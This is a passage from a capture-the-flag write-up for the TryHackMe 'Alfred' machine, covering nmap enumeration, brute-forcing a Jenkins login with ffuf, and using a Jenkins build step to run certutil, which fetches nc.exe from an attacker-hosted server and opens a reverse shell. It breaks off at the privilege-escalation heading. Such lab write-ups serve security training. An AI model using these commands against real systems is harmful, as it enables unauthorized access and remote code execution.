I"É0<h1 id="enumeration">Enumeration</h1>

<p>Run Network Mapper (<strong>nmap</strong>) on Alfred machine to discover opened ports and services.</p>

<p>Full command :</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap <span class="nt">-sV</span> <span class="nt">-sS</span> <span class="nt">-O</span> <span class="nt">-T4</span> <span class="nt">-p-</span> <span class="o">{</span>machine IP<span class="o">}</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> <span class="o">{</span>outputfile<span class="o">}</span></code></pre></figure>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Parameter</th>
      <th style="text-align: left">Functionality</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">-sV</td>
      <td style="text-align: left">Probe open ports to determine service/version info</td>
    </tr>
    <tr>
      <td style="text-align: left">-sS</td>
      <td style="text-align: left">SYN, half TCP scan</td>
    </tr>
    <tr>
      <td style="text-align: left">-O</td>
      <td style="text-align: left">Enable OS detection</td>
    </tr>
    <tr>
      <td style="text-align: left">-T4</td>
      <td style="text-align: left">T{0-5} Set scan speed, higher is faster</td>
    </tr>
    <tr>
      <td style="text-align: left">-p-</td>
      <td style="text-align: left">Scan all 65536 ports</td>
    </tr>
    <tr>
      <td style="text-align: left">-Pn</td>
      <td style="text-align: left">Skip host discovery</td>
    </tr>
    <tr>
      <td style="text-align: left">-oN</td>
      <td style="text-align: left">Write output to a file</td>
    </tr>
  </tbody>
</table>

<p>Output of the scan:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Nmap 7.92 scan initiated Tue Dec 28 09:22:17 2021 as: nmap -sV -sS -O -T4 -p- -Pn -oN alfred.nmap 10.10.195.99</span>
Nmap scan report <span class="k">for </span>10.10.195.99
Host is up <span class="o">(</span>0.030s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows Server 2008 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows Server 2008 R2 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows Server 2008 R2 or Windows 8 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows 7 SP1 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows 8.1 Update 1 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows 8.1 R1 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows Phone 7.5 or 8.0 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows 7 or Windows Server 2008 R2 <span class="o">(</span>89%<span class="o">)</span>, Microsoft Windows Server 2008 or 2008 Beta 3 <span class="o">(</span>89%<span class="o">)</span>
No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Tue Dec 28 09:24:13 2021 -- 1 IP address (1 host up) scanned in 115.63 seconds</span></code></pre></figure>

<p>Three ports are opened:</p>
<h2 id="port-80-http-microsoft-iis-httpd-75">Port 80 http Microsoft IIS httpd 7.5</h2>
<p>Ordinary <a href="https://en.wikipedia.org/wiki/Internet_Information_Services"><strong>Microsoft IIS</strong></a> web server.
<br />Nothing fancy here.
<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/2.png" alt="" /></p>

<h2 id="port-3389-tcpwrapped">Port 3389 tcpwrapped</h2>
<p><strong>tcpwrapped</strong> means that the remote host closed the connection after completing the TCP three-way handshake without receiving any data.
<br /><a href="https://secwiki.org/w/FAQ_tcpwrapped"><strong>More information here</strong>.</a></p>

<h2 id="port-8080-jetty-94z-snapshot">Port 8080 Jetty 9.4.z-SNAPSHOT</h2>

<p>There is a <a href="https://www.geeksforgeeks.org/what-is-jenkins/"><strong>Jenkins</strong></a> login prompt on port 8080.
<br /><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/3.png" alt="" /><br />
If you google it, you will see the default login credentials for Jenkins is <strong>admin</strong> for the username and <strong>admin</strong> for the password.
However, the system administrator could have changed the password to a different one. In that case default credentials
would be useless. So we will brute force the credentials for best practice.<br /></p>

<h1 id="exploitation">Exploitation</h1>

<p>In order to create a continuous HTTP request, we have to know how the HTTP request looks.
Launch the <a href="https://www.geeksforgeeks.org/what-is-burp-suite/"><strong>Burp Suite</strong></a> to examine the HTTP POST request sent 
when a login attempt occurs.
<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/4.png" alt="" /><em>Request</em><br /><br />
There are three fields we have to make sure they are being sent with the HTTP request we will forge for this form.</p>
<ol>
  <li><a href="https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4"><strong>application/x-www-form-urlencoded</strong></a> : Encoding type</li>
  <li><strong>j_username</strong> : Username field</li>
  <li><strong>j_password</strong> : Password Field</li>
</ol>

<p>I will use <a href="https://cybersecnerds.com/ffuf-everything-you-need-to-know/"><strong>ffuf</strong></a> to create POST requests toward the web server.
You can use any fuzzer tool like <strong>THC Hydra</strong>, <strong>Burp Suite</strong> or others. 
<br />Download <a href="https://github.com/danielmiessler/SecLists"><strong>SecLists</strong></a> repo with prepeared wordlists included.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Parameter</th>
      <th style="text-align: left">Functionality</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">-w</td>
      <td style="text-align: left">Dedicated wordlists</td>
    </tr>
    <tr>
      <td style="text-align: left">-u</td>
      <td style="text-align: left">Target URL</td>
    </tr>
    <tr>
      <td style="text-align: left">-data</td>
      <td style="text-align: left">Data which will be sent with the request</td>
    </tr>
    <tr>
      <td style="text-align: left">-H</td>
      <td style="text-align: left">HTTP headers that will be sent with the request</td>
    </tr>
    <tr>
      <td style="text-align: left">-fr</td>
      <td style="text-align: left">Regex which will be filtered out</td>
    </tr>
  </tbody>
</table>

<p>Full command:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ffuf <span class="nt">-w</span> SecLists/Usernames/top-usernames-shortlist.txt:W1,SecLists/Passwords/Common-Credentials/best1050.txt:W2 <span class="nt">-u</span> <span class="s2">"http://10.10.56.186:8080/j_acegi_security_check"</span> <span class="nt">-data</span> <span class="s2">"j_username=W1&amp;j_password=W2"</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/x-www-form-urlencoded"</span> <span class="nt">-fr</span> <span class="s2">"loginError"</span></code></pre></figure>

<p><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/6.png" alt="" /><strong>Cracked the credentials, well done :)</strong><br /><br />
A possible question would be, why filter out ‚ÄúloginError‚Äù string ? 
<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/5.png" alt="" /><em>Left: Request - Right:Response</em><br /><br />
That sent request got a response with <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302"><strong>HTTP 302 status code</strong></a>, which is the status code for redirection.
It means whenever the application receives invalid credentials from the client; the server redirects the client to the ‚Äú/loginError‚Äù URL.
Based on this, as long as the HTTP response does not include ‚Äú/loginError‚Äù in it, it is safe to say we have sent a valid username-password pair
to the server.
<br /><br />
<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/7.png" alt="" /><strong>Login to the Jenkins panel via credentials.</strong></p>

<p>It is possible to do anything that Jenkins can do since we have an admin portal right now.However, if we could get a shell from the
system, it would be amazing.<br /><br />
The way to get a shell from the system is to make Jenkins transmit and execute code in the system shell.<br />
Click on the first project named as <strong>project</strong>, then click <strong>configure</strong>.
Scroll down to the bottom, and you will see a box that executes the windows command written in it.
<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/9.png" alt="" /><br />
On the project page, there is a <strong>Build History</strong> section. It is available to check the output of the batch command that had run.
<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/8.png" alt="" />
Now, instead of printing the string value of the user who executes it with the <strong>whoami</strong> command, we have to connect to that shell.</p>

<p><br />I will use <a href="https://www.ionos.com/digitalguide/server/tools/netcat/"><strong>Netcat</strong></a> in this manner. It is required to have Netcat downloaded in both the attacker and the
victim machine.</p>
<ul>
  <li>Download static <a href="https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe"><strong>nc.exe</strong></a> binary for to run it in the victim machine</li>
  <li>Start a Python3 server in the directory that includes the Netcat static binary file.
<br />Run:</li>
</ul>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80</code></pre></figure>

<p><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/10.png" alt="" /></p>
<ul>
  <li>Start a Netcat listener in the attacker machine.
<br />Run:</li>
</ul>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">nc <span class="nt">-nvlp</span> <span class="o">{</span>ANY FREE PORT<span class="o">}</span></code></pre></figure>

<p><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/11.png" alt="" /></p>
<ul>
  <li>Download the static binary to the victim machine from the Python web server and run it.</li>
</ul>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">certutil.exe</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">http://</span><span class="p">{</span><span class="n">THM</span><span class="w"> </span><span class="nx">IP</span><span class="p">}:</span><span class="mi">80</span><span class="n">/nc.exe</span></code></pre></figure>

<p><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/12.png" alt="" /></p>
<ul>
  <li>Click <strong>Build</strong> button on the project page.
<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/13.png" alt="" /></li>
</ul>

<p>A get request was made to the web server.
<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/14.png" alt="" />
Then we got the shell.
<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/15.png" alt="" /><strong>We are in, nice progress ;)</strong>
To get user flag, run:</p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="kr">type</span><span class="w"> </span><span class="s2">"C:\Users\Bruce\Desktop\user.txt"</span></code></pre></figure>

<h1 id="privilege-escelation">Privilege Escelation</h1>

:ET